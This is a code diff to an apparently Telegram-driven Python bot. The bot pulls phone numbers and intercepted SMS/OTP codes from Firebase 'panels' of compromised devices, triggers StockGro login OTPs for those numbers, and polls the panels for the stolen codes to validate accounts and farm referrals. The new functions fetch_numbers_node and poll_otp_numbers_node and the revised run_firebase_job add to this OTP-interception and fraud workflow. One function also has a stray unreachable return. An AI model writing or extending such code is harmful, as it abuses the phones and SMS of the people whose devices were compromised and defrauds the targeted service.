@@ -623,6 +623,51 @@ def fetch_clients(fb_url: str, fb_key: str, proxy: str | None = None) -> dict:
     return data
 
 
+def normalize_phone_key(key: str) -> str:
+    """'+917877481421' -> '7877481421'. Returns '' if not a valid IN mobile."""
+    digits = re.sub(r"[^0-9]", "", str(key or ""))
+    if len(digits) == 12 and digits.startswith("91") and digits[2] in "6789":
+        return digits[2:]
+    if len(digits) == 10 and digits[0] in "6789":
+        return digits
+    return ""
+
+
+def fetch_numbers_node(fb_url: str, fb_key: str, proxy: str | None = None) -> dict:
+    """Panel /numbers node: {phone_key: {otp, registered, status, ...}}.
+    Returns {10digit: info} (empty dict if panel has no such node)."""
+    data = fb_get(f"{fb_url}/numbers.json{_auth_qs(fb_key, True)}", proxy)
+    if not data or not isinstance(data, dict) or "__error__" in data or "__http_error__" in data:
+        return {}
+    out = {}
+    for k, info in data.items():
+        ph = normalize_phone_key(k)
+        if ph:
+            out[ph] = info if isinstance(info, dict) else {}
+    return out
+
+
+def poll_otp_numbers_node(fb_url: str, fb_key: str, phone: str,
+                          proxy: str | None = None, timeout: int = 40):
+    """Poll /numbers/{phone}/otp (panels that store OTP per number)."""
+    keys = [f"+91{phone}", phone]
+    start = time.time()
+    while time.time() - start < timeout:
+        for k in keys:
+            try:
+                data = fb_get(f"{fb_url}/numbers/{urllib.parse.quote(k, safe='+')}.json{_auth_qs(fb_key, True)}",
+                              proxy, timeout=10)
+                if data and isinstance(data, dict):
+                    otp = str(data.get("otp", "") or "").strip()
+                    if re.fullmatch(r"\d{4,8}", otp):
+                        return otp
+            except Exception:
+                pass
+        time.sleep(3)
+    return None
+    return data
+
+
 def extract_phone_from_device(device: dict) -> str:
     raw = device.get("mobNo", "")
     if not raw or str(raw) in ("", "-", "None"):
@@ -655,7 +700,8 @@ def extract_phone_from_sms(text: str):
 
 
 def _scan_device(args) -> tuple:
-    """Fetch one device's messages and extract numbers. Thread-safe."""
+    """Fetch one device's messages and extract numbers. Thread-safe.
+    Returns (dev_id, online[True/False/None=unknown], primary, sms_list)."""
     fb_url, fb_key, proxy, dev_id, dev = args
     sms_nums = set()
     try:
@@ -672,21 +718,30 @@ def _scan_device(args) -> tuple:
                         sms_nums.add(ph)
     except Exception:
         pass
-    return dev_id, bool(dev.get("status")), extract_phone_from_device(dev), sorted(sms_nums)
+    st = dev.get("status", None)
+    # tri-state: True = online, False = offline, None = panel shares no status
+    if st is None or st == "":
+        online = None
+    elif isinstance(st, str):
+        online = st.strip().lower() in ("1", "true", "online", "active")
+    else:
+        online = bool(st)
+    return dev_id, online, extract_phone_from_device(dev), sorted(sms_nums)
 
 
 def collect_numbers(fb_url: str, fb_key: str, proxy: str | None = None, clients: dict | None = None):
-    """Returns (devices_info, all_numbers). Device message scans run in parallel."""
+    """Returns (devices_info, all_numbers, panel_numbers).
+    devices_info: list of dicts. all_numbers: [(phone, dev_id|None)] with
+    /numbers-node SIMs FIRST (authoritative), then classic extras.
+    panel_numbers: {phone: info} from the /numbers node (registered/otp flags)."""
     from concurrent.futures import ThreadPoolExecutor
     if clients is None:
         clients = fetch_clients(fb_url, fb_key, proxy)
     items = [(fb_url, fb_key, proxy, dev_id, dev) for dev_id, dev in clients.items()
              if isinstance(dev, dict)]
     devices, seen, order = [], set(), []
-    if not items:
-        return devices, order
-    with ThreadPoolExecutor(max_workers=min(10, len(items))) as ex:
-        results = list(ex.map(_scan_device, items))
+    with ThreadPoolExecutor(max_workers=min(10, len(items) or 1)) as ex:
+        results = list(ex.map(_scan_device, items)) if items else []
     by_id = {dev_id: (online, primary, sms) for dev_id, online, primary, sms in results}
     for _url, _key, _px, dev_id, _dev in items:
         online, primary, sms = by_id[dev_id]
@@ -695,7 +750,11 @@ def collect_numbers(fb_url: str, fb_key: str, proxy: str | None = None, clients:
             if ph and ph not in seen:
                 seen.add(ph)
                 order.append((ph, dev_id))
-    return devices, order
+    panel_numbers = fetch_numbers_node(fb_url, fb_key, proxy)
+    # rebuild order cleanly: panel SIMs first (authoritative), then rest
+    rest = [(p, d) for p, d in order if p not in panel_numbers]
+    order = [(p, None) for p in panel_numbers] + rest
+    return devices, order, panel_numbers
 
 
 def get_last_message_key(fb_url: str, fb_key: str, device_id: str, proxy: str | None = None) -> str:
@@ -743,23 +802,38 @@ def checker_report(fb_url: str, fb_key: str, proxy: str | None = None) -> str:
         return ("*FIREBASE CHECK*\n------------------------\n"
                 f"Host: `{fb_host(fb_url)}`\nStatus: *INACTIVE / INVALID*\n"
                 "Could not read clients. Check the URL and key.")
-    devices, order = collect_numbers(fb_url, fb_key, proxy, clients)
-    online = sum(1 for d in devices if d["online"])
-    with_primary = sum(1 for d in devices if d["primary"])
+    devices, order, panel = collect_numbers(fb_url, fb_key, proxy, clients)
+    online = sum(1 for d in devices if d["online"] is True)
+    unknown = sum(1 for d in devices if d["online"] is None)
+    reg = sum(1 for ph, info in panel.items() if info.get("registered") is True)
     lines = [f"*FIREBASE CHECK*\n------------------------",
              f"Host: `{fb_host(fb_url)}`",
              f"Key: {'provided' if fb_key else 'not provided (public access)'}",
              "Status: *ACTIVE*",
-             f"Devices: *{len(devices)}* (Online: *{online}*)",
+             f"Devices: *{len(devices)}* (Online: *{online}*" +
+             (f", Unknown: *{unknown}*" if unknown else "") + ")",
+             f"Panel numbers: *{len(panel)}*" + (f" (registered: *{reg}*)" if reg else ""),
              f"Numbers found: *{len(order)}*",
              ""]
-    for d in devices[:15]:
+    shown = 0
+    for ph, info in panel.items():
+        if shown >= 15:
+            break
+        flag = " (registered)" if info.get("registered") is True else ""
+        lines.append(f"📱 `{ph}`{flag}")
+        shown += 1
+    if len(panel) > 15:
+        lines.append(f"...and {len(panel) - 15} more panel numbers")
+    if shown:
+        lines.append("")
+    for d in devices[:10]:
         short = d["id"][:10]
         prim = f"`{d['primary']}`" if d["primary"] else "-"
         extra = f" +{len(d['sms'])} sms" if d["sms"] else ""
-        lines.append(f"{'🟢' if d['online'] else '🔴'} `{short}` | {prim}{extra}")
-    if len(devices) > 15:
-        lines.append(f"...and {len(devices) - 15} more")
+        dot = "🟢" if d["online"] is True else ("🔴" if d["online"] is False else "⚪")
+        lines.append(f"{dot} `{short}` | {prim}{extra}")
+    if len(devices) > 10:
+        lines.append(f"...and {len(devices) - 10} more devices")
     fresh = sum(1 for ph, _ in order if not is_number_used(ph))
     lines += ["", f"Fresh (unused) numbers: *{fresh}*",
               "Submit this Firebase with the Submit button to start auto refers."]
@@ -781,8 +855,15 @@ def run_firebase_job(bot, loop, chat_id: int, uid: int, fb_url: str, fb_key: str
     proxy = ensure_proxy(proxy)  # dead proxy = 0 success, so validate first
     log.info("job uid=%s host=%s via %s", uid, host, proxy_label(proxy) if proxy else "direct")
     say(f"*Your turn started.*\nHost: `{host}`\nScanning numbers. Please wait.")
-    _devices, order = collect_numbers(fb_url, fb_key, proxy)
-    fresh = [(ph, dev) for ph, dev in order if not is_number_used(ph)]
+    _devices, order, panel = collect_numbers(fb_url, fb_key, proxy)
+    fresh = []
+    for ph, dev in order:
+        if is_number_used(ph):
+            continue
+        if panel.get(ph, {}).get("registered") is True:
+            save_success(ph, uid, "ALREADY_REGISTERED", "-", refcode)
+            continue
+        fresh.append((ph, dev))
     if MAX_NUMBERS_PER_JOB > 0:
         fresh = fresh[:MAX_NUMBERS_PER_JOB]
     if not fresh:
@@ -807,7 +888,7 @@ def run_firebase_job(bot, loop, chat_id: int, uid: int, fb_url: str, fb_key: str
         if d["data"].get("existing_user"):
             save_success(ph, uid, "ALREADY_REGISTERED", "-", refcode)
             continue
-        last_key = get_last_message_key(fb_url, fb_key, dev_id, proxy)
+        last_key = get_last_message_key(fb_url, fb_key, dev_id, proxy) if dev_id else ""
         time.sleep(2)
         dc, sdata, derr = call_with_state(
             lambda st: sg_post(f"{BASE_URL}/login/createOtp",
@@ -820,7 +901,9 @@ def run_firebase_job(bot, loop, chat_id: int, uid: int, fb_url: str, fb_key: str
                 break
             continue
         say(f"SMS sent to `{ph}`. Waiting for auto OTP (up to {OTP_TIMEOUT}s).")
-        otp = poll_for_stockgro_otp(fb_url, fb_key, dev_id, last_key, proxy, OTP_TIMEOUT)
+        otp = poll_otp_numbers_node(fb_url, fb_key, ph, proxy, OTP_TIMEOUT)
+        if not otp and dev_id:
+            otp = poll_for_stockgro_otp(fb_url, fb_key, dev_id, last_key, proxy, OTP_TIMEOUT)
         if not otp:
             continue
         v = sg_post(f"{BASE_URL}/login/validateOtp",
